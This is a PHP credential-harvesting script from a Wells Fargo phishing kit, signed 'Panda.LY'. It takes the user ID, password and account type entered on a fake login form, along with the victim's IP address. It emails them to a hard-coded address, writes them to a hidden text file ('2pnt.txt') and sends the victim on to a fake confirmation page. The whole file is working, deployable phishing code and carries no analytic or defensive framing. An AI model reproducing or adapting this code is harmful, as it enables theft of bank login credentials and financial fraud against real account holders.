<?php

session_start();
include ('bt.php');
$ib = getenv("REMOTE_ADDR");
$random=rand(0,100000000000);
$ran = md5($random);
$_SESSION[$ran] = $random;
$random=rand(0,100000000000);
$rans = md5($random);
$_SESSION[$rans] = $random;
$ip = getenv("REMOTE_ADDR");
$message .= "--------------Wellsfargo Info By Panda.LY -----------------------\n";
$message .= "Account Type            : ".$_POST['destination']."\n";
$message .= "Userid            : ".$_POST['j_username']."\n";
$message .= "Password            : ".$_POST['j_password']."\n";
$message .= "IP                     : ".$ip."\n";
$message .= "---------------Created BY Panda.LY -------------\n";
$send = "Wellsfargo@Wellsfargo.com";
$from = "Wellsfargo@Wellsfargo.com";
    $subject = " Wellsfargo Details: ".$ip.""; 
    mail($send, $subject, $message, $from);m();


$milaf = fopen("./../../../2pnt.txt","a");   
fwrite($milaf,$message);	
	
		   header("Location: confirm.php?country.x=" . $_SESSION['cntc'] . "-" . $_SESSION['cntn'] . "&ReasonCode=04" . $ib . "=codes_list=OAM-2=" . $rans . "S=" . crypt($_SESSION['cntn']) . "" . include '../ran.php' . "");
		   


?>